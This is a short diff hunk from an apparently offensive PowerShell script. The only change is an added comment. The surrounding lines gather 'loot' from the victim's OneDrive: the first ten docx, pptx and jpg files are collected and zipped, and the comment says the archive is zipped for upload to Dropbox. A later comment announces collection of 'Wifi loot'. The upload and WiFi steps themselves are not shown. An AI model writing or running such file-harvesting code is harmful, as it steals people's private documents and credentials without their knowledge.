@@ -74,6 +74,7 @@ try {
     if (Test-Path $env:OneDrive) {
         # For testing purposes I limited this to only certain filetypes as well as only selecting the first 10 objects
         $getLoot = Get-ChildItem -Path $env:OneDrive -Recurse -Include *.docx,*.pptx,*.jpg | Select-Object -First 10
+        # Zipping the OneDrive content for easier upload to Dropbox
         $getLoot | Compress-Archive -DestinationPath $OneDriveLoot -Update
     }
     # Get Wifi loot
